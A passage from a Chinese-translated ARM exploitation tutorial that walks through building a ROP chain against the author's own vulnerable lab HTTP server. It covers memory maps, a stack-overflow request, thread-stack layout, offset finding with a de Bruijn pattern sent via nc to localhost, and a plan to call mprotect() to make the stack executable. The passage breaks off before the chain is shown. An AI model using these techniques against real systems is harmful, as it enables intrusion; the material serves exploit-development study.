这一部分的目的是通过一个已知的脆弱目标开发一个ROP链的整个过程。在本例中，我构建了一个简单易受攻击的HTTP服务器（myhttpd），它在端口8080上的armbox上本地运行。我们发现受攻击的守护进程的URL参数中存在堆栈溢出。有关如何构建myhttpd或实验环境设置的详细信息，请参阅本系列的[第一篇文章](https://blog.3or.de/arm-exploitation-setup-and-tools.html "第一篇文章")。
## 查看内存映射
正如我在上一篇文章中已经提到的，我们需要一部分加载的二进制文件（.text segment，dynamicly loaded libary），在其中搜索
gadget。我用libc做我的ROP链。您可以使用任何其他或多个其他部件。
启动调试器，附加到易受攻击的进程并显示内存映射：
    [root@armbox ~]# r2 -d $(pidof myhttpd)
    = attach 757 757
    bin.baddr 0x00400000
    Using 0x400000
    asm.bits 32
     -- Don't look at the code. Don't look.
    [0xb6ef862c]> dmm
    0x00400000 /usr/bin/myhttpd
    0xb68c2000 /usr/lib/libgcc_s.so.1
    0xb68ef000 /usr/lib/libdl-2.28.so
    0xb6902000 /usr/lib/libffi.so.6.0.4
    0xb691a000 /usr/lib/libgmp.so.10.3.2
    0xb6988000 /usr/lib/libhogweed.so.4.4
    0xb69c6000 /usr/lib/libnettle.so.6.4
    0xb6a0d000 /usr/lib/libtasn1.so.6.5.5
    0xb6a2d000 /usr/lib/libunistring.so.2.1.0
    0xb6ba9000 /usr/lib/libp11-kit.so.0.3.0
    0xb6cae000 /usr/lib/libz.so.1.2.11
    0xb6cd3000 /usr/lib/libpthread-2.28.so
    0xb6cfd000 /usr/lib/libgnutls.so.30.14.11
    0xb6e5a000 /usr/lib/libc-2.28.so
    0xb6fa5000 /usr/lib/libmicrohttpd.so.12.46.0
    0xb6fce000 /usr/lib/ld-2.28.so
    [0xb6ef862c]>
使用的库/二进制文件的（r-x）段越大，就越有机会找到好的gagets。
所以我选择：
    0xb6e5a000 /usr/lib/libc-2.28.so
## 查看溢出
让我们测试一个溢出！我们将发送一个长的URL到“myhttpd”，并检查寄存器和堆栈。
    [root@armbox ~]# cat post_overflow                                                                        │[root@armbox ~]# while true; do gdbserver --attach :5000 $(pidof myhttpd);done                            
    GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA│Attached; pid = 9360                                                                                      
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1│Listening on port 5000                                                                                    
    .1
守护进程崩溃了，我们看到PC被0x41414140覆盖。发生什么事了？正如我在本系列的[第二部分](https://blog.3or.de/arm-exploitation-defeating-dep-execute-system.html
"第二部分")中所解释的，溢出覆盖了非叶函数的已保存LR。一旦这个函数执行它的结束语来恢复保存的值，保存的LR就被弹出到PC中返回给调用者。
关于最低有效位的一个注意事项：BX指令基本上将加载到PC的地址的LSB复制到CPSR寄存器的T状态位，CPSR寄存器在ARM和Thumb模式之间切换核心：ARM（LSB=0）/Thumb（LSB=1）。保存的LR（用0x414141覆盖）被弹出到PC中，然后弹出地址的LSB被写入CPSR寄存器T位（位5），最后PC本身的LSB被设置为0，从而产生0x41414140。
如我们所见，R11还包含我们的值0x41414141。这意味着overflown函数将LR和R11存储并从堆栈中恢复。一些编译器使用R11作为引用来指向函数调用（帧指针）中的局部变量：
然后变量在该函数中作为FP+offset访问。
此外，正如我们在下面中看到的，堆栈包含“A”！因此我们控制PC，R11的值，并且在堆栈上有一些空间。很好。
让我们更深入地研究一下这个堆栈。以下几行显示崩溃后myhttpd进程的内存：
    [0x41414140]> dm
    0x00400000 # 0x00401000 - usr     4K s r-x /usr/bin/myhttpd /usr/bin/myhttpd ; loc.imp._ITM_registerTMCloneTable
    0x00410000 # 0x00411000 - usr     4K s r-- /usr/bin/myhttpd /usr/bin/myhttpd                    
    0x00411000 # 0x00412000 - usr     4K s rw- /usr/bin/myhttpd /usr/bin/myhttpd ; obj._GLOBAL_OFFSET_TABLE
    0x00412000 # 0x00433000 - usr   132K s rw- [heap] [heap]                                        
    0xb5500000 # 0xb5521000 - usr   132K s rw- unk0 unk0                                            
    0xb5521000 # 0xb5600000 - usr   892K s --- unk1 unk1                                                    
    0xb56ff000 # 0xb5700000 - usr     4K s --- unk2 unk2                                                    
    0xb5700000 # 0xb5f00000 - usr     8M s rw- unk3 unk3                                                    
    0xb5f00000 # 0xb5f21000 - usr   132K s rw- unk4 unk4                                                    
    0xb5f21000 # 0xb6000000 - usr   892K s --- unk5 unk5                                                
    0xb60bf000 # 0xb60c0000 - usr     4K s --- unk6 unk6                                                
    0xb60c0000 # 0xb68c2000 - usr     8M s rw- unk7 unk7                                                
    [...]
    loaded libraries
    [...]
    0xbefdf000 # 0xbf000000 - usr   132K s rw- [stack] [stack]
    0xffff0000 # 0xffff1000 - usr     4K s r-x [vectors] [vectors]
一个值得注意的事情是，SP（SP=0xb5efea50）并没有指向为[堆栈]的部分，而是指向映射库上面（按地址）的一个段：
    0xb5521000 # 0xb5600000 - usr   892K s --- unk1 unk1
了解这里发生了什么是值得的。现在，我不确定为什么r2的dm（或gdb的vmmap）在这里不显示（rw-）权限-我假设我们看到了主进程的（rw-）映射。使用的microhttpd库打开一个侦听器线程，然后为每个新连接打开一个工作线程。
检查以下strace以了解正在发生的情况（pid 363是侦听器线程，370是工作线程）：
    [pid   363] mmap2(NULL, 8392704, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0xb56ff000
    [pid   363] mprotect(0xb5700000, 8388608, PROT_READ|PROT_WRITE) = 0
    [pid   363] clone(child_stack=0xb5efef98, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tidptr=0xb5eff4c8, tls=0xb5eff920, child_tidptr=0xb5eff4c8) = 370
你可以在这里找到整个 strace。
我们看到侦听器线程（glibc）正在为线程准备一个堆栈，并为其分配一个appropriate子堆栈。我花了一些时间才明白。。。为了使记忆地图形象化，我画了一张图。。。：
    +------------------+-------------------------------------------------------------------------------------------+
    |                  |                                                                                           |
    |  No R/W          |                                      ...AAAAAAA               pthread_t, TLS of thread    |
    |  permissions     |    mprotect(RW)                                                |
    |                  |                                                                                           |
    +------------------+--------------------------------------------------------------+----------------------------+
    0xb56ff000      0xb5700000                                          ^             ^                   0xB5F00000
                                                                        |             |
      guard memory                      thread stack growing downwards  |             +
     <-----------------------------------------------------------+ 0xb5efef98
                                                                        |             SP of thread at creation
                                                                    SP at crash
                                                                     0xb5efea50
mmap2（）分配没有（--）权限的内存块（8392704字节，从0xb56ff000开始）（请参阅系统调用mmap2（），参数PROT_NONE）。然后，mprotect（）将（rw-）权限添加到该内存区域的某个部分，但在开始时会遗漏一点（8388608字节，从0xb570000开始）。线程堆栈（clone（）的子堆栈参数）将指向（rw-）区域。由于堆栈向下扩展内存区域，因此没有（rw-）权限的堆栈将充当保护页。由于堆栈已经增长了一点，所以我们在崩溃后观察到的SP值指向一个地址，这个地址比初始子堆栈值小一点。
好吧，让我们总结一下：我们控制了执行流，还获得了一些内存来存储我们的ROP链！
## 确定偏移
我们在上一篇文章中已经了解到，了解堆栈布局对于构建堆栈溢出至关重要。如果堆栈中存储了大量或较大的局部变量，则必须将ROP负载向更高的内存区域移动许多字节，才能达到保存的LR。因此，下一步是找到正确的偏移量（overflowgen.py脚本中的shifter变量，我将很快介绍），以便将第一个gadget的地址（因此整个ROP链和溢出数据）准确地移到保存的LR所在的位置。多年来，已经开发了很多工具来简化这项任务，其中一个包含在metasploit框架中（/usr/share/metasploit
framework/tools/pattern_create.rb）。但由于我们使用的是radare2，我们可以使用ragg2的内置Bruijin模式生成器：
    [root@armbox ~]# BRUIJN=`ragg2 -r -P 250| tr -d '\n'`; echo -e "GET $BRUIJN HTTP/1.1\n" | nc 127.0.0.1 808│COMM may either be a tty device (for serial debugging),                                                   
    0                                                                                                         │HOST:PORT to listen for a TCP connection, or '-' or 'stdio' to use
正如您所看到的，ragg2并不避免将1放入LSB中（不过，我不知道metasploit是否这样做）。因此，如果ragg2没有找到偏移量，请尝试使用+1：
  * PC: 144 Bytes
  * SP: 148 Bytes
为了参考生成和查询Bruijin模式的命令行:
    BRUIJN=`ragg2 -r -P 250| tr -d '\n'`; echo -e "GET $BRUIJN HTTP/1.1\n" | nc 127.0.0.1 8080
然后可以使用ragg2查询找到的偏移量：`ragg2-q 0x。。。。`
## 利用漏洞
根据ROP链的长度，基本上可以执行所有在shellcode中执行的命令。尽管如此，堆栈上的空间可能会受到限制，而且构建、测试和执行shellcode要简单得多。现在我们有两个相互冲突的目标：我们在堆栈上有shellcode的内存空间，但是堆栈只有（rw-）-我们不能执行它。在创建工作线程堆栈时，我们已经遇到了systemcall
mprotect（）。没有什么能阻止我们再次使用该系统调用来生成堆栈（rwx）而不是（rw-），然后从堆栈中执行shellcode。许多经典的ROP链正是使用这种技术。。。
### 定义目标：mprotect（）的参数
mprotect（）的原型：
    int mprotect(void *addr, size_t len, int prot);
*addr是mprotect（）开始应用权限的地址。结果是：在调用之后，下一个len字节将设置通过prot参数传递的权限。参数prot必须是以下值的异或：
    32 #define PROT_READ       0x1             /* Page can be read.  */
    33 #define PROT_WRITE      0x2             /* Page can be written.  */
    34 #define PROT_EXEC       0x4             /* Page can be executed.  */
    35 #define PROT_NONE       0x0             /* Page can not be accessed.  */
    mman-linux.h
我们的目标寄存器值是：